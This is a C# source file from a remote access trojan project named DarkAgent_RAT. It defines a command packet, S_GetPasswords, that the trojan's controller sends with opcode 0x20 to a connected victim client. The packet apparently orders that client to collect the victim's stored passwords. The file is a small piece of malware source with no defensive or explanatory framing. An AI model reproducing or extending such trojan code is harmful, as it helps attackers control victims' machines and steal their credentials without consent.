using System;
using System.Collections.Generic;
using System.Text;

namespace DarkAgent_RAT.src.Network.DataNetwork.Packets.Send
{
    public class S_GetPasswords : SendBasePacket
    {
        public S_GetPasswords(RatClients client)
            : base(client)
        {
        }
        protected internal override void Write()
        {
            WriteByte(0x20);
        }
    }
}
